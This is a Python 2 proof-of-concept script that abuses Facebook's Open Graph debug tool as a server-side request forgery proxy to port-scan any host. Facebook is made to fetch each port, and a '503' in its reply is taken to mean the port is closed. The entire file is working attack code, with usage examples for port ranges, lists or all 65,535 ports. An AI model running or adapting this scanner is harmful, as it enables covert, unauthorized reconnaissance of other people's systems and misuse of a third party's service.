#Author: Riyaz Ahemed Walikar

import sys
import requests
import time

useragent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'}

def portscan(port):
        payload = {'q': 'http%3A%2F%2F' + str(ip) + '%3A' + str(port) + '%2Findex.html'}
        r = requests.get ('http://developers.facebook.com/tools/debug/og/object', allow_redirects=False, params=payload, headers=useragent)
        if r.status_code == 200:
                data = r.text
                status = 'unknown'
	        if data.find('>503</td>') > 1: #check if response contains 503 which means port closed anything else means its open
                        status = 'Closed'
                else:
                        status = 'Open'
                        
                print str(port) + ":" + status


helpmsg = 'PoC for FB URL Port Scanning\nCreated by Riyaz Ahemed Walikar\n\nUsage: \
fbportscan.py <public_ip> <portrange|all|csv_ports>\n\nExample: xspafbportscanner.py scanme.nmap.org 20-3890\nExample: \
fbportscan.py scanme.nmap.org all\nExample: xspafbportscanner.py scanme.nmap.org 22,23,80,445,3389\n\nProvide valid external/internal public hostnames/ip.'

if len(sys.argv) < 3:
        print "Not enough parameters.\n"
        print helpmsg
        sys.exit()
        
ip = sys.argv[1]
portnum = sys.argv[2]

print 'Starting portscan on ' + ip + ' using the Facebook URL: http://developers.facebook.com/tools/debug/og/object?q=\n'

if portnum.find("-") > 1:
    startport = int(portnum.split("-")[0])
    endport = int(portnum.split("-")[1])
    for port in range(startport,endport+1):
        portscan(port)
    sys.exit()
    
if str.upper(portnum) == "ALL":
    for port in range(1,65536):
        portscan(port)
    sys.exit()
    
if portnum.find(",") > 1:
    ports = portnum.split(",")
    for port in ports:
        portscan(port)
    sys.exit()

if portnum.isdigit() == 1:
    if int(portnum) > 0 and int(portnum) < 65536:
        port = int(portnum)
        portscan(port)
        sys.exit()

    
print "Invalid parameters.\n"
print helpmsg
sys.exit()
